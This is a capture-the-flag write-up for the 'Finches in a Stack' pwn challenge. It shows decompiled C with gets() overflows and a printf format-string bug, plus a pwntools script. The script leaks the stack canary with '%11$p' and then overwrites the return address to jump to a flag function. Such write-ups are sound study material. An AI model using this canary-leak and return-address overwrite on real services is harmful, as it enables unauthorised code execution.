# Finches in a Stack

> There's a service at 88.198.219.20:13311, exploit it to get the flag.

## Description

Let's disassemble the binary with Ghidra. The main function calls the
following function:

```c  
void say_hi(void)  
{  
 char cVar1;  
 uint uVar2;  
 char *pcVar3;  
 int in_GS_OFFSET;  
 byte bVar4;  
 char local_29 [4];  
 undefined2 uStack37;  
 undefined local_22 [18];  
 int local_10;  
  
 bVar4 = 0;  
 local_10 = *(int *)(in_GS_OFFSET + 0x14);  
 printf("Hi! What\'s your name? ");  
 gets((char *)((int)&uStack37 + 1));  
 printf("Nice to meet you, ");  
 uVar2 = 0xffffffff;  
 pcVar3 = (char *)((int)&uStack37 + 1);  
 do {  
   if (uVar2 == 0) break;  
   uVar2 = uVar2 - 1;  
   cVar1 = *pcVar3;  
   pcVar3 = pcVar3 + (uint)bVar4 * -2 + 1;  
 } while (cVar1 != '\0');  
 *(undefined2 *)((int)&uStack37 + ~uVar2) = 0xa21;  
 *(undefined *)((int)&uStack37 + ~uVar2 + 2) = 0;  
 printf((char *)((int)&uStack37 + 1));  
 puts("Do YOU want to pet my canary?");  
 gets(local_29);  
 if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {  
   __stack_chk_fail_local();  
 }  
 return;  
}  
```

There are a lot of vulnerabilities here:  
- there is a first buffer overflow for buffer `local22 = &ustack37 + 1`  
- then there is a format string vulnerability which prints the content of this same buffer  
- finally the buffer `local29` can also be overflown.  
- there is another function `flag` implemented which leak the flag.

The issue is that canaray protection is enabled. With `checksec`, we remark
that PIE is not enabled.

## Solution

The format string vulnerability can leak the value of the canaray. Therefore
we exploit it to leak the canary value and use it when we overflow the second
buffer to overwrite the return address with `flag` address.

```python  
from pwn import *

sh = remote('88.198.219.20', 30709)

print(sh.recvuntil("name?").decode())

# Leak canary  
offset = 11  
payload = "%{}$p".format(offset)  
sh.sendline(payload)

print(sh.recvuntil("you, ").decode(), end="")  
canary = sh.recvuntil("!").decode()  
print(canary)  
canary = int(canary.split("!")[0], 16)

# Overflow  
offset_canary = 4*6+1  
offset_ret = 3*4  
flag = 0x80491d2 # PIE not enabled  
print(sh.recvuntil("canary?").decode())  
payload = b" "*offset_canary + p32(canary) + b" "*offset_ret + p32(flag) +
"".join([str(i)*4 for i in range(9)]).encode()

sh.sendline(payload)

sh.interactive()  
```

Flag: `ractf{St4ck_C4n4ry_FuN!}`

Original writeup (https://github.com/apoirrier/CTFs-
writeups/blob/master/AwesomeCTF2020/PWN/FinchesStack.md).